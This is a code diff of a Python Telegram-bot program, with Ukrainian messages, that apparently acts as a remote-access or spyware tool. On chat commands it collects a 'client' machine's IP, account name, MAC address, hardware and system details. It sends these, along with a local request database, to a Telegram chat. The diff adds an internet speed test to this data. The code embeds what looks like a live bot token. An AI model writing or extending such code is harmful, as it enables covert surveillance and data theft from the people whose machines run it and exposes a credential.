@@ -17,12 +17,10 @@ import pyautogui
 import sys
 import cv2
 import webbrowser
+import speedtest
 
 sv = sys.version
 pv = (sv[0] + sv[1] + sv[2] + sv[3] + sv[4] + sv[5])
-
-
-
 
 
 bot = telebot.TeleBot("6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ")
@@ -147,6 +145,19 @@ def main():
             elif get_message_text(upd).lower() == "/pc":
                 send_message(get_chat_id(upd),
                              f"Ім'я пристрою клієнта: {n}")
+            elif get_message_text(upd).lower() == "/speedtest":
+                st = speedtest.Speedtest()
+                download_speed_1 = st.download()
+                upload_speed_1 = st.upload()
+                download_speed = download_speed_1 / (2 ** 20)
+                upload_speed = upload_speed_1 / (2 ** 20)
+                ping = st.results.ping
+                send_message(get_chat_id(upd),
+                             f"Швидкість завантаження: {download_speed} Мбіт/сек")
+                send_message(get_chat_id(upd),
+                             f"Швидкість вивантаження: {upload_speed} Мбіт/сек")
+                send_message(get_chat_id(upd),
+                             f"Пінг: {ping} Мбіт/сек")
             elif get_message_text(upd).lower() == "/system":
                 send_message(get_chat_id(upd),
                              f"ОС: {my_system.system}")
@@ -196,7 +207,7 @@ def main():
                              "Всі дані про клієнта в .txt форматі:")
                 file = open("info.txt", "w")
                 file.write(
-                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n Версія Python клієнта: {pv}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
+                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n Версія Python клієнта: {pv}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n Швидкість завантаження: {download_speed}\n Швидкість вивантаження: {upload_speed}\n Пінг: {ping}\n[================================================]\n")  # Пишем
                 file.close()
                 upfile = open("info.txt", "rb")
                 bot.send_document(get_chat_id(upd), upfile)
@@ -248,6 +259,8 @@ def main():
                 send_message(get_chat_id(upd),
                              "/memory - Подивитись завантаженість пам'яті клієнта")
                 send_message(get_chat_id(upd),
+                             "/speedtest - Подивитись щвидкість інтернету клієнта (Деяка затримка)")
+                send_message(get_chat_id(upd),
                              "/data - Надіслати базу даних запитів з пристрою клієнта")
                 send_message(get_chat_id(upd),
                              "/site - Посилання на сайт програми")
@@ -288,6 +301,18 @@ def main():
                              f"Завантаженість ЦП: {cpu_percent}")
                 send_message(get_chat_id(upd),
                              f"Завантаженість пам'яті: {memory_info.percent}")
+                st = speedtest.Speedtest()
+                download_speed_1 = st.download()
+                upload_speed_1 = st.upload()
+                download_speed = download_speed_1 / (2 ** 20)
+                upload_speed = upload_speed_1 / (2 ** 20)
+                ping = st.results.ping
+                send_message(get_chat_id(upd),
+                             f"Швидкість завантаження: {download_speed} Мбіт/сек")
+                send_message(get_chat_id(upd),
+                             f"Швидкість вивантаження: {upload_speed} Мбіт/сек")
+                send_message(get_chat_id(upd),
+                             f"Пінг: {ping} Мбіт/сек")
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
                 upfile = open("ip.sl3", "rb")
@@ -297,7 +322,7 @@ def main():
                              "Всі дані про клієнта в .txt форматі:")
                 file = open("info.txt", "w")
                 file.write(
-                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n[================================================]\n")  # Пишем
+                    f"[================================================]\n IP клієнта: {a}\n Запит клієнта: {ip}\n Ім'я пристрою клієнта: {n}\n Ім'я облікового запису клієнта: {d_n}\n Версія Python клієнта: {pv}\n ОС: {my_system.system}\n Реліз ОС: {my_system.release}\n Версія: {my_system.version}\n Процессор: {my_system.processor}\n Монітор: {monitor.width}x{monitor.height}\n Інформація про батарею: {battery_info}\n Машина: {my_system.machine}\n MAC-адрес клієнта: {mac}\n Завантаженість ЦП: {cpu_percent}\n Завантаженість пам'яті: {memory_info.percent}\n Швидкість завантаження: {download_speed}\n Швидкість вивантаження: {upload_speed}\n Пінг: {ping}\n[================================================]\n")  # Пишем
                 file.close()
                 upfile_3 = open("info.txt", "rb")
                 bot.send_document(get_chat_id(upd), upfile_3)
